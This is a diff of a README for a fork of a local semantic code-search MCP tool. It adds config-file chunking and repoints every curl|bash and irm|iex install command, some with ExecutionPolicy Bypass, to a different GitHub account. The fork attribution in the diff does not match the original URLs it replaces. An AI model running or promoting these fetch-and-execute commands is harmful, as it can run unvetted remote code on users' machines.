@@ -26,28 +26,30 @@
 
 Claude Context without the cloud. Semantic code search that runs 100% locally using local embedding models on your own machine. No API keys, no costs, your code never leaves your machine.
 
+This repository is a fork of [tlines2016/claude-context-local](https://github.com/tlines2016/claude-context-local), with the install flow, chunking, and retrieval improvements in this fork published from `nadiahariyah3272/claude-context-local`.
+
 - 🔍 **Find code by meaning, not strings**
 - 🔒 **100% local - completely private**
 - 💰 **Zero API costs - forever free**
 - ⚡ **Fewer tokens in Claude Code and fast local searches**
 
-An intelligent code search system that uses Hugging Face embedding models and advanced multi-language chunking to provide semantic search capabilities across 18 file extensions and Kotlin/Java/Markdown-aware codebases, integrated with Claude Code via MCP (Model Context Protocol).
+An intelligent code search system that uses Hugging Face embedding models and advanced multi-language chunking to provide semantic search capabilities across 22 file extensions, including Kotlin plus path-aware YAML/TOML/JSON config chunking, integrated with Claude Code via MCP (Model Context Protocol).
 
 ## 🚧 Beta Release
 
 - Core functionality working
-- Installation tested on Mac/Linux
+- Installer flows documented for macOS, Linux, WSL2, Git Bash, and Windows PowerShell
 - Benchmarks coming soon
 - Please report issues!
 
 ## Demo
 
-<img src="https://github.com/FarhanAliRaza/claude-context-local/releases/download/v0.1/example.gif" alt="Demo of local semantic code search" width="900" />
+Demo media for this fork is being refreshed. In the meantime, use the install commands and `python scripts/cli.py setup-guide` examples below to verify the local setup flow on your OS.
 
 ## Features
 
-- **Multi-language support**: 18 file extensions across Python, JavaScript, TypeScript, Java, Kotlin, Markdown, Go, Rust, C, C++, C#, and Svelte
-- **Intelligent chunking**: AST-based (Python) + tree-sitter (JS/TS/Go/Java/Kotlin/Markdown/Rust/C/C++/C#)
+- **Multi-language support**: 22 file extensions across Python, JavaScript, TypeScript, Java, Kotlin, Markdown, Go, Rust, C, C++, C#, Svelte, YAML, TOML, and JSON
+- **Intelligent chunking**: AST-based (Python) + tree-sitter (JS/TS/Go/Java/Kotlin/Markdown/Rust/C/C++/C#) + path-aware structured config chunking (YAML/TOML/JSON)
 - **Semantic search**: Natural language queries to find code across all languages
 - **Rich metadata**: File paths, folder structure, semantic tags, language-specific info
 - **MCP integration**: Direct integration with Claude Code
@@ -71,25 +73,25 @@ Claude’s code context is powerful, but sending your code to the cloud costs to
 #### macOS / Linux / Git Bash
 
 ```bash
-curl -fsSL https://raw.githubusercontent.com/FarhanAliRaza/claude-context-local/main/scripts/install.sh | bash
+curl -fsSL https://raw.githubusercontent.com/nadiahariyah3272/claude-context-local/main/scripts/install.sh | bash
 ```
 
 If your system doesn't have `curl`, you can use `wget`:
 
 ```bash
-wget -qO- https://raw.githubusercontent.com/FarhanAliRaza/claude-context-local/main/scripts/install.sh | bash
+wget -qO- https://raw.githubusercontent.com/nadiahariyah3272/claude-context-local/main/scripts/install.sh | bash
 ```
 
 #### Windows PowerShell
 
 ```powershell
-irm https://raw.githubusercontent.com/FarhanAliRaza/claude-context-local/main/scripts/install.ps1 | iex
+irm https://raw.githubusercontent.com/nadiahariyah3272/claude-context-local/main/scripts/install.ps1 | iex
 ```
 
 If PowerShell blocks script execution in your shell, use:
 
 ```powershell
-powershell -ExecutionPolicy Bypass -c "irm https://raw.githubusercontent.com/FarhanAliRaza/claude-context-local/main/scripts/install.ps1 | iex"
+powershell -ExecutionPolicy Bypass -c "irm https://raw.githubusercontent.com/nadiahariyah3272/claude-context-local/main/scripts/install.ps1 | iex"
 ```
 
 #### Windows Command Prompt (`cmd.exe`)
@@ -97,7 +99,7 @@ powershell -ExecutionPolicy Bypass -c "irm https://raw.githubusercontent.com/Far
 Open PowerShell from cmd and run the PowerShell installer:
 
 ```bat
-powershell -ExecutionPolicy Bypass -c "irm https://raw.githubusercontent.com/FarhanAliRaza/claude-context-local/main/scripts/install.ps1 | iex"
+powershell -ExecutionPolicy Bypass -c "irm https://raw.githubusercontent.com/nadiahariyah3272/claude-context-local/main/scripts/install.ps1 | iex"
 ```
 
 #### WSL2 (Windows Subsystem for Linux)
@@ -105,7 +107,7 @@ powershell -ExecutionPolicy Bypass -c "irm https://raw.githubusercontent.com/Far
 Install from your WSL terminal using the bash installer:
 
 ```bash
-curl -fsSL https://raw.githubusercontent.com/FarhanAliRaza/claude-context-local/main/scripts/install.sh | bash
+curl -fsSL https://raw.githubusercontent.com/nadiahariyah3272/claude-context-local/main/scripts/install.sh | bash
 ```
 
 The installer automatically detects WSL2 and provides WSL-specific guidance after
@@ -117,13 +119,13 @@ register the MCP server from a Windows terminal as well.
 Run the same install command to update:
 
 ```bash
-curl -fsSL https://raw.githubusercontent.com/FarhanAliRaza/claude-context-local/main/scripts/install.sh | bash
+curl -fsSL https://raw.githubusercontent.com/nadiahariyah3272/claude-context-local/main/scripts/install.sh | bash
 ```
 
 On Windows, re-run the PowerShell command instead:
 
 ```powershell
-irm https://raw.githubusercontent.com/FarhanAliRaza/claude-context-local/main/scripts/install.ps1 | iex
+irm https://raw.githubusercontent.com/nadiahariyah3272/claude-context-local/main/scripts/install.ps1 | iex
 ```
 
 The installer will:
@@ -141,12 +143,12 @@ Before running the installer, set `CODE_SEARCH_MODEL` to the Hugging Face model 
 
 ```bash
 export CODE_SEARCH_MODEL=Qwen/Qwen3-Embedding-0.6B
-curl -fsSL https://raw.githubusercontent.com/FarhanAliRaza/claude-context-local/main/scripts/install.sh | bash
+curl -fsSL https://raw.githubusercontent.com/nadiahariyah3272/claude-context-local/main/scripts/install.sh | bash
 ```
 
 ```powershell
 $env:CODE_SEARCH_MODEL="Qwen/Qwen3-Embedding-0.6B"
-irm https://raw.githubusercontent.com/FarhanAliRaza/claude-context-local/main/scripts/install.ps1 | iex
+irm https://raw.githubusercontent.com/nadiahariyah3272/claude-context-local/main/scripts/install.ps1 | iex
 ```
 
 The installer downloads the chosen model and persists the selection in:
@@ -211,8 +213,9 @@ storage directories, and detects WSL2/Windows environments.
 
 ```
 claude-context-local/
-├── chunking/                         # Multi-language chunking (18 extensions)
-│   ├── multi_language_chunker.py     # Unified orchestrator (Python AST + tree-sitter)
+├── chunking/                         # Multi-language chunking (22 extensions)
+│   ├── multi_language_chunker.py     # Unified orchestrator (Python AST + tree-sitter + structured config)
+│   ├── structured_data_chunker.py    # Semantic chunking for YAML/TOML/JSON config files
 │   ├── python_ast_chunker.py         # Python-specific chunking (rich metadata)
 │   └── tree_sitter.py                # Tree-sitter: JS/TS/JSX/TSX/Svelte/Go/Java/Kotlin/Markdown/Rust/C/C++/C#
 ├── embeddings/
@@ -261,7 +264,8 @@ The system uses advanced parsing to create semantically meaningful chunks across
 ### Chunking Strategies
 
 - **Python**: AST-based parsing for rich metadata extraction
-- **All other languages**: Tree-sitter parsing with language-specific node type recognition
+- **Programming languages and Markdown**: Tree-sitter parsing with language-specific node type recognition
+- **Structured config files**: Path-aware sections for YAML, TOML, and JSON inspired by modern indexing pipelines
 
 ### Chunk Types Extracted
 
@@ -271,12 +275,14 @@ The system uses advanced parsing to create semantically meaningful chunks across
 - **Enums/Constants**: Value definitions and module-level declarations
 - **Namespaces/Modules**: Organizational structures
 - **Templates/Generics**: Parameterized type definitions
+- **Config sections/entries**: Top-level and nested composite settings for YAML, TOML, and JSON
 
 ### Rich Metadata for All Languages
 
 - File path and folder structure
 - Function/class/type names and relationships
 - Language-specific features (async, generics, modifiers, etc.)
+- Structured config section paths
 - Parent-child relationships (methods within classes)
 - Line numbers for precise code location
 - Semantic tags (component, export, async, etc.)
@@ -407,7 +413,7 @@ That keeps the retrieval stack unchanged while still letting you move to a domai
 
 ### Supported Languages & Extensions
 
-**Fully Supported (18 extensions across 12 languages/content types):**
+**Fully Supported (22 extensions across 15 languages/content types):**
 
 | Language       | Extensions                    |
 | -------------- | ----------------------------- |
@@ -423,8 +429,11 @@ That keeps the retrieval stack unchanged while still letting you move to a domai
 | **C++**        | `.cpp`, `.cc`, `.cxx`, `.c++` |
 | **C#**         | `.cs`                         |
 | **Svelte**     | `.svelte`                     |
+| **YAML**       | `.yaml`, `.yml`               |
+| **TOML**       | `.toml`                       |
+| **JSON**       | `.json`                       |
 
-**Total**: **18 file extensions** across **12 languages/content types**
+**Total**: **22 file extensions** across **15 languages/content types**
 
 ## Storage
 
